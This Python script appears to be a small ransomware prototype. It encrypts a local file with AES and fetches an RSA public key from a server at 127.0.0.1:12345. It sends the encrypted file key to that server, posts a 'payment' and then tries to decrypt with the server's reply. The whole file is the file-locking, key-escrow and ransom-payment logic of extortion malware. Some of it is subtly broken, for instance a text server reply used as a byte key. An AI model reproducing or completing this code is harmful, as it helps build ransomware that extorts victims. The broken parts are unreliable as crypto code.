import requests
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import rsa



iv = None
def generate_key():
    key_size = 16
    key = Fernet.generate_key()
    key = key[:key_size]
    return key

def encrypt_file(key):
    with open('file.txt', 'rb') as f:
        data = f.read()
    
    # Pad the data to a multiple of 16 bytes
    padded_data = data + b"\0" * (16 - len(data) % 16)
    
    # Generate a random 16-byte IV
    iv = os.urandom(16)
    
    # Create an AES cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    
    # Encrypt the data
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    
    return iv, encrypted_data

def decrypt_file(key, iv, encrypted_data):
    # Create a cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    
    # Decrypt the data
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    
    # Unpad the data
    data = padded_data.rstrip(b"\0")
    
    return data



def send_encypted_key(data):
    response = requests.post('http://127.0.0.1:12345/receive_encryptedKey', data={'data': data})
    return response.text

def receive_public_key():
    response = requests.get(' http://127.0.0.1:12345/send_public_key')
    return response.text

def send_payment():
    data= 49856
    response = requests.post(' http://127.0.0.1:12345/payment', data={'data': data})
    print(response.text)
    return response.text


def encrypt_key(key, public_key):
    # convert the public key to an rsa object
    public_key = rsa.PublicKey.load_pkcs1(public_key)
    cipher_rsa = rsa.encrypt(key, public_key)
    return cipher_rsa
if __name__ == "__main__":
    key_original  = generate_key()
    iv,encrypted_file= encrypt_file(key_original)
    # save the encrypted file
    with open('encrypted_file.txt', 'wb') as f:
        f.write(encrypted_file)
    public_key = receive_public_key()
    key_encrypted = encrypt_key(key_original , public_key)
    print("Encrypted key:", key_encrypted)
    # convert the encrypted key to string
    key_encrypted = key_encrypted.hex()
    print("Encrypted key:", key_encrypted)
    response = send_encypted_key(key_encrypted )

    # send payment
    sendingPay = send_payment()
    print("Server Response:", sendingPay)
    # decrypt the file
    file_decrypted = decrypt_file(sendingPay, iv, encrypted_file)


